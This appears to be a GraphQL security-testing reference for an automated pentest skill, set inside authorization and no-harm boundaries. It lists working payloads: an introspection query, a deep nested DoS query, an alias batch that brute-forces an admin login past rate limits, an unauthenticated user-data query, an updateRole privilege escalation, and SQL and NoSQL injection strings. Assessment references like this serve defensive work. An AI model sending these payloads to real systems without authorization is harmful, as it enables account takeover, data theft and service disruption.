# GraphQL Security Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

GraphQL security vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Introspection Leakage | ✓ Query schema structure | - | Execute mutations for harm |
| Query Depth Limit | ✓ Test deep query limit | - | DoS via deep queries |
| Field Suggestion | ✓ Observe field hints | - | Enumerate all sensitive fields |
| Mutation Testing | ✓ Verify mutation exists | ✓ Execute mutation | Malicious data modification |
| Batch Query Attack | ✓ Test batch handling | ✓ Send large batches | DoS via resource exhaustion |

**Safe Validation Method**: Query schema and verify capabilities exist; do not execute harmful mutations.

### Basic Introspection Query (Get Schema)
```graphql
# Get all types, fields, parameters
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
*Tools: GraphQL Voyager, InQL (Burp plugin)*

## Depth Query DoS

### Nested Query Causing Resource Exhaustion
```graphql
# Malicious nested query
query {
  author(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

## Batch Query Bypass Rate Limit

### Aliases Bypass
```graphql
# Use aliases to send multiple queries simultaneously, bypass login/captcha rate limits
query {
  a1: login(username: "admin", password: "password123") { token }
  a2: login(username: "admin", password: "password1") { token }
  a3: login(username: "admin", password: "123456") { token }
  a4: login(username: "admin", password: "admin") { token }
}
```

## Field Enumeration/Suggestion

### Field Name Brute Enumeration and Suggestion Exploitation
```graphql
# Use suggested field names in error messages (Did you mean "password"?)
query {
  user(id: 1) {
    pass
    pwd
    email
    hash
  }
}
```

## Unauthorized Access

### Query Sensitive Types
```graphql
# Direct access to GraphQL endpoint without authentication, query sensitive information
query {
  users {
    id
    username
    email
    password
    role
  }
}

# Try accessing internal/admin interfaces
mutation {
  updateRole(userId: 1, role: "ADMIN") {
    success
  }
}
```

## GraphQL to SQL/NoSQL Injection

### Injection via GraphQL Parameters
```graphql
# SQL injection
query {
  user(id: "1' OR '1'='1") {
    username
    email
  }
}

# NoSQL injection
query {
  user(id: "{\"$ne\": null}") {
    username
    email
  }
}
```

## Analysis Process

1. Identify GraphQL endpoint (usually `/graphql`, `/api/graphql`, `/v1/graphql`)
2. Try Introspection query to get complete Schema
3. Analyze Schema for sensitive fields, unauthorized Queries or Mutations
4. Test depth query DoS and alias batch queries
5. Test parameter injection (SQLi, NoSQLi, XSS, etc.)
6. Confirm vulnerability existence

## Output

- Proof payload
- Complete request packet (HTTP format)
- Leaked Schema or sensitive data fragments

## Severity Classification

GraphQL severity is based on "whether introspection exposes sensitive data or mutations enable privilege escalation/bulk actions" — endpoint existence alone is Low. 

| Actual case | Severity | Note |
|---------|------|------|
| introspection enabled + sensitive fields/data are reachable (password/PII/internal types) | High | sensitive data reachable |
| mutation can cause privilege escalation / bulk (alias bulkbrute force/privilege escalation updateRole) | High | authentication/rate-limit bypass |
| introspection enabledbut no sensitive data (schema contains only public business fields) | Medium | limited information disclosure |
| introspection disabled, only field suggestions/blind probing available | Medium | capability limited |
| only GraphQL endpoint discovered (/graphql is reachable, no capability confirmed) | Low | Informational |
| can bulk export all users PII / privilege escalationbulk tampering | Critical | large-scale data/asset impact |

**Key judgment**: Reporting High requires confirming "introspection exposed sensitive data" or "mutation can actually causes privilege escalation or bulk impact". Endpoint reachability only / introspection disabled record Low; introspection enabled with schema containing no sensitive content record as Medium.

---

## Prohibited

- ⚠️ No destructive Mutation operations
- ⚠️ No DoS attacks causing server crash
- ⚠️ Only prove existence + provide command/PoC